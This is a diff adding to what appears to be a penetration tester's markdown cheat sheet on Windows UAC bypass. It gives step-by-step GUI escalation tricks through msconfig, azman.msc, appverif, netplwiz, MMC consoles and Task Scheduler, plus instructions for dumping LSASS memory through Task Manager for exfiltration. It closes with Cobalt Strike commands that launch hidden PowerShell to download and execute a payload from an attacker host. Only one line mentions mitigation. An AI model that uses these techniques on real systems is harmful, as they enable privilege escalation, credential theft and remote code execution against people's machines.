@@ -145,37 +145,131 @@ C:\> Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 So, what this script does is create a new progID with the name “.hack” and then directly associate the payload with the command used when opening such files. which then points the CurVer entry of ms-settings to our “.hack” progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the “.hack” program ID and use its associated command. 
 ```
 
-## msconfig (GUI)
+## msconfig (RUN)
 ```
 Case study : msconfig
 Spawn run and enter msconfig
 There are exemptions that allow certain program binaries to execute without prompts, in this case, msconfig
-    Now navigate to “Tools” and launch
+    Now navigate to “Tools” and launch command prompt.
 
 We will obtain a high IL command prompt without interacting with UAC in any way.
+The mitigation for this is to set UAC to the maximum level
 ```
 
-## asman.msc (GUI)
+## azman.msc (RUN)
 ```
+AZMAN.MSC
+Run azman.msc
+Click Help
+Right click on the right-hand pane and click VIEW SOURCE
+From notepad click FILE OPEN
+Right click + shift and click open powershell window here
+And now you have a process with high integrity
+
+example 2:
 asman.msc
 Case Study : azman.msc (Authorization manager)
     As with msconfig, azman.msc will auto elevate without requiring user interaction. 
     If we can find a way to spawn a shell from within that process, we will bypass UAC. 
     Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell.
     
-first spawn run and run  azman.msc
-    To run shell we will abuse the application’s help    
-        We will right-click any part of the help menu, you can click on “help topics', then right click and ”view source",  select view source
+first spawn run and run azman.msc
+To run shell we will abuse the application’s help    
+We will right-click any part of the help menu, you can click on “help topics', then right click and ”view source",  select view source
+Notepad will open, go to tabs and click open
+open C:\Windows\System32\cmd.exe
 ```
 
-## Notepad (GUI)
+## appverif.exe (RUN)
 ```
-Notepad        
+It's almost the same as the azman.msc bypass:
+open run
+run appverif --> Click yes and allow to run.
+help (f1)
+right click ----> View Source Code
+Notepad will open, go to open
+open C:\Windows\System32\cmd.exe
+```
+
+## Notepad (RUN)
+```
+run Notepad        
 This will spawn a notepad process that we can leverage to get a shell. 
  go to File->Open and make sure to select All Files in the combo box on the lower right corner. 
  Go to C:\Windows\System32 and search for cmd.exe and open the program       
  This will open cmd.exe at a high privsec level.
 ```
+
+## iscsicpl.exe
+```
+Another method comes from running c:\windows\system32\iscsicpl.exe
+Click No
+Click CONFIGURATION
+Click REPORT
+Right Click + SHIFT and Open Powershell
+```
+
+## Task Scheduler
+```
+Open Task Scheduler
+On the right in the actions panel, go to create task.
+Create a new task named shellz in \ , select run only when user is logged on and run with the highest privileges.
+Go to Actions in create task.
+add a new action
+Action: Start a Program, cmd
+Click ok
+Right click and run the task
+```
+
+## LOLBAS / MMC / Device Manager / Group Policy Editor etc. 
+```
+Spawn Run
+mmc devmgmt.msc
+Click Help
+Help Topics
+Rick click and view source
+Use the file open and then RIGHT CLICK + SHIFT to launch a shell Graphical user interface Description automatically generated
+
+You can run these with all kinds of the .msc consoles:
+
+MORE
+A list of more binaries we can use:
+netplwiz.exe
+dcomcnfg.exe
+perfmon.exe
+compMgmtLauncher.exe
+eventvwr.exe
+
+There’s lots of ways of doing this via binaries.
+```
+
+## netplwiz.exe LOLBAS and LSASS from taskmgr.exe
+```
+netplwiz.exe is used to change the user membership to Standard user, Administrator, Guest, or any other profile; however, the primary functionality is not what really matters here. We are interested in abusing this using unintended functionality.
+
+Start by typing netplwiz.exe in the medium-integrity command prompt of the local admin user that was spawned using the runas command.
+Then, select the “Advanced” tab and select the “Advanced” option in the Advanced user management section.
+The Local Users and Groups (Local) box will open. From that box select Help > Help Topics
+Right-click in the MMC box and select View Source — This will open up a notepad TXT document of the source code.
+On the Notepad document that opened, select File > Open
+Navigate to Computer > Local Disk (C:) > Windows > System32 and then change filetype to All Files
+Scroll down to find cmd.exe and then Right-click cmd.exe > select “Run as administrator”
+A high-integrity cmd Prompt at your service.
+
+This same technique could be used to run taskmgr.exe instead of cmd.exe as administrator and then you could perform a memory dump on the LSASS process: 
+
+Dump Lsass from taskmgr.exe:
+Dumping the LSASS Process: Task Manager (GUI)
+use the credentials of the local administrator account that we created, and RDP into the host to obtain a GUI session.
+sudo xfreerdp /u:pwnt /p:'Password123' /v:172.16.1.50 +clipboard
+After confirming that we have local admin privileges on the system, we can proceed to dump the LSASS process.
+Since we have GUI access on the victim, the first way we will dump the LSASS process is by using Task Manager.
+To create a process dump file, right click on the task bar (bottom bar) and then click Task Manager.
+Next, we need to click the More Details drop down arrow and then go to the Details tab. From there, we can scroll down and then right-click on lsass.exe and select “Create Dump File”.
+If it works, a popup box will appear that shows us the path to the DMP file.
+The dump was successfully created and is ready for us to exfiltrate onto our attacker machine.
+```
+
 
 ## UAC-bypass.c (https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c)
 ```
@@ -322,7 +416,19 @@ KRBUACBypass.exe asktgs
 KRBUACBypass.exe krbscm
 ```
 
+## UAC bypass with Cobalt Strike
+```
+The Cobalt Strike techniques will only work if UAC is not set at it's max security level.
+# UAC bypass via token duplication
+elevate uac-token-duplication [listener_name]
+# UAC bypass via service
+elevate svc-exe [listener_name]
 
+# Bypass UAC with Token Duplication
+runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+# Bypass UAC with CMSTPLUA COM interface
+runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+```
 
 
 
